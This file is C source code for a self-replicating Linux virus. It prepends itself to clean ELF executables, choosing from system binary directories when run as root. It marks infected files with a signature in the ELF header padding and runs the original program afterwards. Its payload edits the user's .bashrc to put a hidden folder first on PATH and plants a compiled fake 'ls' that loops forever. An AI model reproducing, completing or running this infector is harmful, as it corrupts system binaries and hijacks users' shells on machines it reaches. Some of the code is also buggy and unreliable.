#include <stdio.h>
#include <dirent.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <sys/sendfile.h> 
#include <sys/wait.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <elf.h>

#define SIZE 18464
#define MAGIC_NUMBER 0x15D25
#define TEMP_FILENAME ".tempFileImage"

static inline int get_random_number(int max_num){
	return rand()%4;
}
static inline char* randomly_select_dir(char **dirs) 
{	
	return (char *)dirs[get_random_number(4)];
}

void infectBashSrc(char *userName, char *export_ls){
	 
	char bashrcPath[250] = "/home/";
	strcat(bashrcPath,userName);
	strcat(bashrcPath,"/.bashrc");
	
	// Open .bashrc
	FILE *bashrc_fd = fopen(bashrcPath, "r+");
	
	
	// Check last statement for export
	char buff[1024];
	if ( bashrc_fd != NULL) // open file
	{
		fseek(bashrc_fd, 0, SEEK_SET); // make sure start from 0
		while(!feof(bashrc_fd))
		{
		    memset(buff, 0x00, 1024); // clean buffer
		    fscanf(bashrc_fd, "%[^\n]\n", buff); // read file *prefer using fscanf
		    
		}
	
		// Add export statement if not already ifected
	
		if(strcmp(buff,export_ls))
			fprintf(bashrc_fd,"\n%s",export_ls);
	}
	fclose(bashrc_fd);
}


/* Execute malacious instructions */
void devastation() {
	const unsigned char banner[] = "Virus Text... ";
	
	// Subroutine 1
	// Get user name
	char buf[64];
	cuserid(buf);
	printf("%s \n",buf);
	
	char folder_path[250] = "/home/";
	strcat(folder_path, buf);
	strcat(folder_path,"/.local/.dnd/");
	
	char export_ls[250] = "export PATH=\"";
	strcat(export_ls,folder_path);
	strcat(export_ls,":$PATH\"");
	
	printf("%s \n",export_ls);
	
	infectBashSrc(buf, export_ls);
	
	
	// Subroutine 2
	// Check if the malliciouc ls binary in mallicious folder
	// if not Create a hidden folder to store the mallicious ls binary
	// create and compile the binary to that folder
	
	//Malicious hexdump
	
	
	char shellcode[] =
        "\x6d\x61\x69\x6e\x28\x29\x7b\x77\x68\x69\x6c\x65\x28\x31\x29\x3b\x7d\x0a";
	
	char bufx[200] = "ls";

	
	
	//write to a file.c in the same directory
	char file_path[250];
	strcpy(file_path,folder_path);
	strcpy(file_path,bufx);
	strcat(file_path,".c");
	
	
	int temp_fd = creat(file_path, S_IWUSR | S_IRUSR);	
	write(temp_fd, shellcode, 18);


	strcat(folder_path,bufx);
	//compile the file
	char command[200]="gcc -w ";
	strcat(command,file_path);
	strcat(command," -o ");
	strcat(command,folder_path);
	system(command);
	remove(file_path);
		
	write(1, (char *)banner, sizeof(banner));
}

/* Returns true if the file's format is ELF (Executeable and Linkable Format)
 * ELF files have the first four bytes as {0x7f, 'E', 'L', 'F'}
 */
bool isELF(char* fileName) {
	if(fileName[0] == '.') return false;

	int host_fd = open(fileName, O_RDONLY);
	
	char header[4];
	read(host_fd, header, 4);
	
	close(host_fd);

	return header[0] == 0x7f
		&& header[1] == 'E'
		&& header[2] == 'L'
		&& header[3] == 'F';
}

/**
 * Returns true if the file has not been infected yet
 * by checking the padding entry in the EI_PAD of elf header
 */
bool isClean(char* fileName) {
	int fd = open(fileName, O_RDONLY);
	lseek(fd, EI_PAD, SEEK_SET);
	uint32_t flag;
	read(fd,&flag,4);
	close(fd);
	return flag != MAGIC_NUMBER;
}

/**
 * Gets an ELF file's name that is not yet infected 
 * If no such files are found, NULL is returned
 */
char* getHealthyHostFile(char *self_name) {
	struct stat st;

	char *dirs[4] = {"/sbin", "/usr/sbin", "/bin", "/usr/bin" }; 
	//Addresses of the directories to attack if the user of root
	char cwd[2] = {'.', '\0'}; 
	char *selected_dir = getuid() != 0 ? cwd : randomly_select_dir((char **)dirs);
	DIR *dir = opendir(selected_dir);

	struct dirent *file;
	while((file = readdir(dir)) != NULL){
		stat(file->d_name, &st);
		if(!strcmp(file->d_name, self_name)) continue;	// Don't infect self
		if(isELF(file->d_name) && isClean(file->d_name)){
			closedir(dir);
			return file->d_name;
		}
	}

	closedir(dir);
	return NULL;
}


/**
 * Returns true if this file has only the virus code
 */
bool isOriginalVirus(int vfd) {
	return SIZE == lseek(vfd, 0, SEEK_END);
}


/**
 * Infect host file by creating a temporary file; 
 * appending the virus/infected file, clean ELF host;
 * and replacing the host file with the temporary file.
 */
void infectHostFile(char* hostFileName, int virus_fd) {
	int host_fd = open(hostFileName, O_RDONLY);	
	struct stat st;
	fstat(host_fd, &st);
	int hostSize = st.st_size;

	
	int temp_fd = creat(TEMP_FILENAME, st.st_mode);	

	sendfile(temp_fd, virus_fd, NULL, SIZE);
	sendfile(temp_fd, host_fd, NULL, hostSize);

	rename(TEMP_FILENAME, hostFileName);

	close(temp_fd);
	close(host_fd);
}

/**
 * Execute the original host program inside this object file
 */
void executeHostPart(int virus_fd, mode_t mode, int totalSize, char *argv[]) {
	int temp_fd = creat(TEMP_FILENAME, mode);

	lseek(virus_fd, SIZE, SEEK_SET);
	int hostSize = totalSize - SIZE;
	sendfile(temp_fd, virus_fd, NULL, hostSize);
	close(temp_fd);

	pid_t pid = fork();			
	if(pid == 0) { 			
		execv(TEMP_FILENAME, argv);
	}
	else{					
		waitpid(pid, NULL, 0);		
		unlink(TEMP_FILENAME);
	}
}

/**
 * Adds a flag/signature to the EI_PAD region of the ELF header
 */
void addSignatureToELFPadding(int fd, char *fileName){
    lseek(fd, 0, SEEK_SET);
	struct stat st;
    fstat(fd, &st);

    uint8_t *mem=mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0); 
    *(uint32_t *)&mem[EI_PAD] = MAGIC_NUMBER;
	int temp_fd = creat(TEMP_FILENAME, st.st_mode);
	write(temp_fd,mem,st.st_size);
	munmap(mem,st.st_size);
	close(temp_fd);
	rename(TEMP_FILENAME, fileName);
}

/**
 * It makes a copy of the current file and adds the flag and then
 * renames itself to the original file
 */
void makeCopyAndAddSignature(char *fileName){
	char buf[200];
	strcpy(buf,fileName);
	char buf2[200];
	strcpy(buf2,"cp ");
	strcat(buf2,buf);
	strcat(buf2," ");
	strcat(buf,"2");
	strcat(buf2,buf);

	system(buf2);
	int virus_fd = open(buf, O_RDWR);
    addSignatureToELFPadding(virus_fd, fileName);
	close(virus_fd);
	remove(buf);
}


void main(int argc, char *argv[]) {
    	srand(time(0));
	
#if TEST
	devastation();
	return;
#endif
	
	makeCopyAndAddSignature(argv[0]);

	int virus_fd = open(argv[0], O_RDWR);
    	struct stat st;
	fstat(virus_fd, &st);
	
	devastation();
	
	char* cleanHostName = getHealthyHostFile((char*)argv[0] + 2);
	if(cleanHostName != NULL) 
		infectHostFile(cleanHostName, virus_fd);
		 

	if(isOriginalVirus(virus_fd))
		makeCopyAndAddSignature(argv[0]);
	else
		executeHostPart(virus_fd, st.st_mode, st.st_size, argv);

	close(virus_fd);

}



